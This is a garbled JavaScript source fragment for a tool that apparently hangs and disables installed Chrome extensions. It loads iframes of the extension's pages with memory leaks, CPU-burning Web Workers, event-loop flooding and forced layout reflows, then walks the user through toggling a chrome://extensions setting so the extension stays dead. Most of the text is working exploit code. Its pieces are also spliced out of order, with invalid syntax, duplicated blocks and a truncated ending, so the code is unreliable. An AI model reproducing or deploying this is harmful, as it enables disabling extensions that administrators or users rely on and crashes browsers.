  // K. Advanced Memory Exhaustion Techniques
  let wasmMemory;
  fetch('wasm/memory.wasm')
    .then(response => response.arrayBuffer())
    .then(bytes => WebAssembly.instantiate(bytes))
    .then(results => {
      wasmMemory = results.instance.exports.memory;
      setInterval(() => {
        const newBuffer = new Uint8Array(wasmMemory.buffer.byteLength * 2);
        wasmMemory.buffer = newBuffer.buffer;
      }, 100);
    });

  let obj1 = {};
  let obj2 = {};
  obj1.ref = obj2;
  obj2.ref = obj1;
  setInterval(() => {
    let obj3 = {};
    let obj4 = {};
    obj3.ref = obj4;
    obj4.ref = obj3;
  }, 100);

  let weakRef = new WeakRef({});
  setInterval(() => {
    if (weakRef.deref() === undefined) {
      weakRef = new WeakRef({});
    }
  }, 100);

  let largeString = "start";
  setInterval(() => {
    largeString += "add";
  }, 10);

  
  // L. Refining CPU-Bound Operations
  let cacheInvalidationArray = new Array(100000).fill(0);
  setInterval(() => {
    for (let i = 0; i < 10000; i++) {
      cacheInvalidationArray[Math.floor(Math.random() * 100000)]++;
    }
  }, 10);

  let deoptimizationVar = 0;
  function deoptimizeMe(x) {
    if (x > 100) {
      return x;
    }
    return deoptimizeMe(x + 1);
  }
  setInterval(() => {
    deoptimizationVar = deoptimizeMe(deoptimizationVar);
  }, 10);

  let matrix = new Array(100).fill(null).map(() => new Array(100).fill(0));
  setInterval(() => {
    for (let i = 0; i < 100; i++) {
      for (let j = 0; j < 100; j++) {
        matrix[i][j] += Math.random();
      }

  
  slider.max = maxIframeCount;
  sliderValueDisplay.textContent = defaultIframeCount;

  slider.addEventListener("input", function () {
    sliderValueDisplay.textContent = this.value;
  });    
       
  // --- Iframe Overload with Memory Leak, CPU Consumption, Event Loop Blocking, and Subtle Techniques --  const createIframeWithHang = {iframeSrc} => {
    const iframe = document.createElement('iframe');
    iframe.src = iframeSrc;
    iframe.style.width = '100%';
    iframe.style.height = '100px';
killButton.addEventListener("click", function () {
    const selectedSrc = killButton.getAttribute("data-url");
    const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
    killButton.style.display = "none";
    killExtensionText.innerHTML = `Make sure to keep this tab open. Then open <a href="chrome://extensions/?id=${extensionId}" target="_blank" style="color: blue; text-decoration: underline;">chrome://extensions/?id=${extensionId}</a> in a new tab.`;
  });
});


  await populateSelectOptions();

    iframe.onload = () => {
      try {
        const iframeWindow = iframe.contentWindow;
        const iframeDocument = iframe.contentDocument;

        (function() {
  const iframeDocument = document;
  

  // B. Intense CPU Consumption
  const cpuBoundTasks = [];
  for (let i = 0; i < 4; i++) {
    const worker = new Worker(URL.createObjectURL(new Blob([`
      self.onmessage = function(e) {
        let result = 0;
        for (let i = 0; i < 10000000; i++) {
          result += Math.sin(i);
        }
        self.postMessage(result);
      };
    `], { type: 'text/javascript' })));
    worker.postMessage(null);
    cpuBoundTasks.push(worker);
  }

  let cpuLoop = true;
  let cpuLoopStartTime = Date.now();
  const cpuLoopInterval = setInterval(() => {
    if (cpuLoop) {
      let result = 0;
      for (let i = 0; i < 100000; i++) {
        result += Math.sin(i);
      }
      if (Date.now() - cpuLoopStartTime > 5000) {
        cpuLoop = false;
        clearInterval(cpuLoopInterval);
      }
    }
  }, 1);

  function recursiveFunction(depth) {
    if (depth > 1000) return;
    recursiveFunction(depth + 1);
  }
  recursiveFunction(0);

  // C. Event Loop Blocking & Overload
  for (let i = 0; i < 1000; i++) {
    Promise.resolve().then(() => {
      let result = 0;
      for (let j = 0; j < 10000; j++) {
        result += Math.cos(j);
      }
    });
  }

  for (let i = 0; i < 1000; i++) {
    setTimeout(() => {
      let result = 0;
      for (let j = 0; j < 10000; j++) {
        result += Math.tan(j);
      }
    }, 1);
  }

  // D. Subtle & Continuous Resource Exhaustion
  let subtleLeak = [];
  setInterval(() => {
    subtleLeak.push({});
    iframeDocument.body.appendChild(iframeDocument.createElement('span'));
  }, 100);

  let subtleCpu = 0;
  const subtleCpuInterval = setInterval(() => {
    for (let i = 0; i < 10000; i++) {
      subtleCpu += Math.sqrt(i);
    }
  }, 100);

  // E. Exploiting Browser Rendering and Layout Engines
  let reflowElement = iframeDocument.createElement('div');
  reflowElement.style.width = '100px';
  reflowElement.style.height = '100px';
  reflowElement.style.backgroundColor = 'red';
  iframeDocument.body.appendChild(reflowElement);

  setInterval(() => {
    reflowElement.style.width = Math.random() * 200 + 'px';
    reflowElement.offsetWidth;
    reflowElement.style.height = Math.random() * 200 + 'px';
  }, 10);

  // F. Subtle Event Loop Manipulation
  let promiseChain = Promise.resolve();
  for (let i = 0; i < 100; i++) {
    promiseChain = promiseChain.then(() => new Promise(resolve => setTimeout(resolve, 10)));
  }


  // --- Main Functionality ---
  const warning = () => {
    overlay.style.display = "flex";
    const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
    const selectedSrc = iframeSelect.value;
    const iframeCount = parseInt(slider.value, 10);

    const popup = window.open("", "PopupWindow", `width=${window.screen.width},height=${window.screen.height}`);
    const popupDocument = popup.document;
    const iframeContainer = popupDocument.createElement('div');
    iframeContainer.id = 'iframeContainer';
    popupDocument.body.appendChild(iframeContainer);

    replaceIframes(iframeContainer, selectedSrc, iframeCount);

    setTimeout(() => {
      popup.close();
      killExtensionText.innerHTML = `Now that the extension <strong>${selectedOption}</strong> has been hanged, press the button above.`;
      setTimeout(() => {
        overlay.style.display = "none";
        killExtensionText.style.display = "block";
        killButton.style.display = "inline-block";
        hangButton.style.display = "none";
        iframeSelect.style.display = "none";
        document.getElementById("labelForIframeSelect").style.display = "none";
        slider.style.display = "none";
        sliderValueDisplay.style.display = "none";
        document.getElementById("labelForIframeSlider").style.display = "none";
        killButton.setAttribute("data-url", selectedSrc);
      }, 10000);
    }, 5000);
  };

  const openExtensionPopup = () => {
    const selectedSrc = killButton.getAttribute("data-url");
    const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
    killButton.style.display = "none";
    killExtensionText.innerHTML = `Make sure to keep this tab open. Then open <a href="chrome://extensions/?id=${extensionId}" target="_blank" style="color: blue; text-decoration: underline;">chrome://extensions/?id=${extensionId}</a> and flip the switch called "Allow access to file URLs" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.`;
  };

  // --- Event Listeners ---
  hangButton.addEventListener("click", warning);
  killButton.addEventListener("click", openExtensionPopup);
})();rHTML = `Make sure to keep this tab open. Then open <a href="chrome://extensions/?id=${extensionId}" target="_blank" style="color: blue; text-decoration: underline;">chrome://extensions/?id=${extensionId}</a> and flip the switch called "Allow access to file URLs" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.`;
  };
